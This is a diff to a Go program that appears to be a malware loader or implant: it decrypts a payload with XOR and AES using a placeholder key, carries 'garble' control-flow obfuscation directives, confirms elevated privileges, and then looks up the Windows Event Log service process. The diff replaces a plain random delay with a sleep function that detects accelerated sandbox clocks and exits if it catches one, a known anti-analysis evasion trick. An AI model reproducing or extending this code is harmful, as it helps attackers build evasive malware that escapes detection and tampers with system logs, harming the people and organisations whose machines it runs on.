@@ -27,7 +27,6 @@ var (
 	XORAESKey, _ = hex.DecodeString("%XORAESKEY%")
 )
 
-// .garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func verifyDataIntegrity(data []byte, stage string) bool {
 	log.Printf("[*] Verifying data integrity at stage: %s", stage)
 	if len(data) == 0 {
@@ -38,7 +37,6 @@ func verifyDataIntegrity(data []byte, stage string) bool {
 	return true
 }
 
-// .garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func aesDecrypt(ciphertext, key []byte) ([]byte, error) {
 	log.Printf("[*] Starting AES decryption - Input size: %d bytes", len(ciphertext))
 
@@ -68,7 +66,6 @@ func aesDecrypt(ciphertext, key []byte) ([]byte, error) {
 	return ciphertext, nil
 }
 
-// .garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func xorDecrypt(data, key []byte) ([]byte, error) {
 	log.Printf("[*] Starting XOR decryption - Input size: %d bytes", len(data))
 
@@ -87,7 +84,6 @@ func xorDecrypt(data, key []byte) ([]byte, error) {
 	return data, nil
 }
 
-// .garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func decryptkey(data, key []byte) ([]byte, error) {
 	keyLen := len(key)
 	if keyLen == 0 {
@@ -101,7 +97,24 @@ func decryptkey(data, key []byte) ([]byte, error) {
 	return data, nil
 }
 
-// .garble:controlflow flatten_passes=3 junk_jumps=128 block_splits=max flatten_hardening=xor,delegate_table
+//from golang package docs
+func Sleep() {
+	rand.Seed(time.Now().UnixNano())
+	seconds := rand.Intn(6) + 10
+	fmt.Printf("[+] Sleeping for %d Seconds\n", seconds)
+	t0 := time.Now()
+	time.Sleep(time.Duration(seconds) * time.Second)
+	t1 := time.Now()
+	diff := t1.Sub(t0)
+	fmt.Println("[+] Woke Up ... Execution Continues")
+
+	fmt.Printf("[+] The function took %v to run.\n", diff)
+	if diff.Seconds() < float64(seconds) {
+		log.Fatalln("[-] The function returned too early! Expected at least", seconds, "seconds, but got", diff.Seconds(), "seconds.")
+	}
+}
+
+//garble:controlflow flatten_passes=3 junk_jumps=128 block_splits=max flatten_hardening=xor,delegate_table
 func main() {
 	log.SetFlags(0)
 
@@ -111,12 +124,8 @@ func main() {
 		return
 	}
 	fmt.Println("[+] Process elevated")
-
-	rand.Seed(time.Now().UnixNano())
-	sleepDuration := time.Duration(rand.Intn(15)+1) * time.Second
-	fmt.Printf("[+] Sleeping for %v\n", sleepDuration)
-	time.Sleep(sleepDuration)
-	fmt.Println("[+] Woke Up ... Execution Continues")
+	//call sleep function
+	Sleep()
 
 	eventlogPid, err := EVENT_LOG.GetEventLogPid()
 	if err != nil {
